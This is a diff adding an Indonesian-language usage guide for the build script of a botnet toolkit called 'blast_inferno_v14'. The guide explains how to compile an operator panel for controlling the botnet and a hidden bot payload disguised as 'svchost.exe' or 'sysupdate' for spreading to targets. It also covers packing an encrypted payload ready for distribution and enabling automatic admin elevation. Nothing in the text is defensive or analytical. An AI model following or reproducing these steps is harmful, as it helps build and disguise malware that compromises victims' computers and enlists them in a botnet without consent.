@@ -1,0 +1,75 @@
+Cara pake setup.py:
+
+1. Install semua dependency:
+
+```bash
+python3 setup.py install
+```
+
+Ini auto-install: aiohttp, aiohttp_socks, cryptography, brotli, scapy, playwright, paramiko, pyinstaller, dll.
+
+2. Build Operator Panel EXE:
+
+```bash
+python3 setup.py build-operator
+```
+
+Output: dist/SystemUpdate.exe (Windows) atau dist/system_update (Linux)
+
+· Console: ON (biar panel interaktif keliatan)
+· Lo pake ini buat ngontrol botnet
+
+3. Build Bot Payload EXE:
+
+```bash
+python3 setup.py build-bot
+```
+
+Output: dist/svchost.exe (Windows) atau dist/sysupdate (Linux)
+
+· Console: OFF (hidden, jalan di background)
+· Ini yang lo sebar ke target
+
+4. Build semua:
+
+```bash
+python3 setup.py build-all
+```
+
+Output: dua-duanya.
+
+5. Pack encrypted payload:
+
+```bash
+python3 setup.py pack
+```
+
+Output: dist/payload_encrypted.zip — payload terenkripsi siap sebar.
+
+6. Bersihin build files:
+
+```bash
+python3 setup.py clean
+```
+
+---
+
+Struktur folder setelah build:
+
+```
+blast_inferno_v14/
+├── blast_inferno.py      # Main script
+├── setup.py               # Setup/build script
+├── dist/                  # Output EXE/binary
+│   ├── SystemUpdate.exe   # Operator panel
+│   ├── svchost.exe        # Bot payload
+│   └── payload_encrypted.zip  # Payload terenkripsi
+└── build/                 # Temporary build files
+```
+
+Custom config (ubah di CONFIG dict):
+
+· icon_file: path ke .ico buat icon EXE
+· console: True (keliatan) atau False (hidden)
+· onefile: True (single EXE) atau False (folder)
+· uac_admin: True kalo mau auto-request admin
